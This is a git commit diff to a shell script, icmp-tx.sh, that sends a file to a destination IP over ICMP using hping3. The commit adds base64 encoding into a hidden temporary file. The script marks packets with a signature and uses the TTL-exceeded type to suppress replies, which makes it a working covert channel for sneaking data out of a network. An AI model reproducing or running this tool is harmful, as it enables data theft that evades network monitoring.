01c686f93c4adcd58104bb765a74527663783b84
polyphemus11 <miguel.zapata27@gmail.com>
2015-08-05 22:55:07 -0500

    Update icmp-tx.sh

--- icmp-tx.sh
+++ icmp-tx.sh
@@ -1,13 +1,15 @@
 #$1 - destination IP
 #$2 - signature
-#$3 - filename
+#$3 - plain text file 
 #$4 - data frame size
 #$5 - icmp type
 #Option -C 11 is ttl exceeded preventing a reply
 #Usage: hping3 [dest ip] [signature] [tx file] [data frame size] [icmp type]
+base64 -w 0 $3 > ./.target.base64
 while true; do
-        if hping3 $1 --icmp --sign $2 --file $3 -d $4 -u -C $5 2>&1 | grep -q --line-buffered -m 1 EOF; then
+        if hping3 $1 --icmp --sign $2 --file ./.target.base64 -d $4 -u -C $5 2>&1 | grep -q --line-buffered -m 1 EOF; then
          echo "EOF Reached"
          exit
         fi
 done
+rm ./.target.base64
